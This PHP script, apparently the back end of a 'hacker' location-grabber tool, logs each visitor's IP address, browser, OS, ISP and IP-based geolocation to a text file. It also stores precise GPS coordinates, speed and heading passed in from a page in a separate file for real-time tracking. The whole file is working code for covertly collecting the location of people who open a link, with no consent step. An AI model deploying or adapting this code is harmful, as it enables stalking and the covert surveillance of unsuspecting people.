<?php

# ip.php by MD-HACKER
# Author   : MD-HACKER
# Github   : https://github.com/MD-HACKER07
# Website  : https://abushalem.site/
# Instagram: https://www.instagram.com/iammd_18_
# LinkedIn : https://in.linkedin.com/in/md-abu-shalem-alam-726a93292
# Date     : 24-04-2024

error_reporting(E_ERROR | E_PARSE);

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();

$PublicIP = get_client_ip();
$file       = 'ip.txt';
$ip         = "IP                   : ".$PublicIP;
$uaget      = "User Agent: ".$user_agent;
$bsr        = "Browser              : ".$user_browser;
$uos        = "User OS              : ".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;

// Get precise location from received GPS data if available
$precise_latitude = isset($_GET['lat']) ? $_GET['lat'] : '';
$precise_longitude = isset($_GET['lng']) ? $_GET['lng'] : '';
$precise_accuracy = isset($_GET['accuracy']) ? $_GET['accuracy'] : '';
$precise_altitude = isset($_GET['altitude']) ? $_GET['altitude'] : '';
$precise_speed = isset($_GET['speed']) ? $_GET['speed'] : '';
$precise_heading = isset($_GET['heading']) ? $_GET['heading'] : '';
$precise_timestamp = isset($_GET['timestamp']) ? $_GET['timestamp'] : '';

$details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');
if ($success==false) {
fwrite($fp, $ip."\n");
fwrite($fp, $uos."\n");
fwrite($fp, $version."\n");
fwrite($fp, $bsr."\n");

if (!empty($precise_latitude) && !empty($precise_longitude)) {
    $precise_location = "Precise Location     : https://www.google.com/maps/place/$precise_latitude,$precise_longitude";
    $precise_details  = "GPS Details          : Accuracy: $precise_accuracy m, Altitude: $precise_altitude m, Speed: $precise_speed m/s, Heading: $precise_heading°";
    $gps_timestamp    = "GPS Timestamp        : ".date('Y-m-d H:i:s', $precise_timestamp/1000);
    
    fwrite($fp, $precise_location."\n");
    fwrite($fp, $precise_details."\n");
    fwrite($fp, $gps_timestamp."\n");
}

fclose($fp);
} else if ($success==true) {
$country  = $details['country'];
$city     = $details['city'];
$continent= $details['continent'];
$tp       = $details['type'];
$cn       = $details['country_phone'];
$is       = $details['isp'];
$latitude = $details['latitude'];
$longitude= $details['longitude'];
$crn      = $details['currency'];

$type       = "IP Type              : ".$tp;
$comma      = ", ";
$location   = "Location             : ".$city.$comma.$country.$comma.$continent;
$geolocation= "GeoLocation(lat, lon): ".$latitude.$comma.$longitude;
$isp        = "ISP                  : ".$is;
$currency   = "Currency             : ".$crn;
fwrite($fp, $ip."\n");
fwrite($fp, $type."\n");
fwrite($fp, $uos."\n");
fwrite($fp, $version."\n");
fwrite($fp, $bsr."\n");
fwrite($fp, $location."\n");
fwrite($fp, $geolocation."\n");
fwrite($fp, $currency."\n");

// Add precise GPS data if available (more accurate than IP-based location)
if (!empty($precise_latitude) && !empty($precise_longitude)) {
    $precise_location = "Precise Location     : https://www.google.com/maps/place/$precise_latitude,$precise_longitude";
    $precise_details  = "GPS Details          : Accuracy: $precise_accuracy m, Altitude: $precise_altitude m, Speed: $precise_speed m/s, Heading: $precise_heading°";
    $gps_timestamp    = "GPS Timestamp        : ".date('Y-m-d H:i:s', $precise_timestamp/1000);
    
    fwrite($fp, $precise_location."\n");
    fwrite($fp, $precise_details."\n");
    fwrite($fp, $gps_timestamp."\n");
}

fclose($fp);
} else {
$status     = "Status               : ".$success;
fwrite($fp, $status."\n");
fwrite($fp, $uaget."\n");
fclose($fp);
}

// Store GPS data in a separate file for real-time tracking
if (!empty($precise_latitude) && !empty($precise_longitude)) {
    $gps_file = 'location_history.txt';
    $gps_data = date('Y-m-d H:i:s') . ",$PublicIP,$precise_latitude,$precise_longitude,$precise_accuracy,$precise_altitude,$precise_speed,$precise_heading\n";
    file_put_contents($gps_file, $gps_data, FILE_APPEND);
}
?> 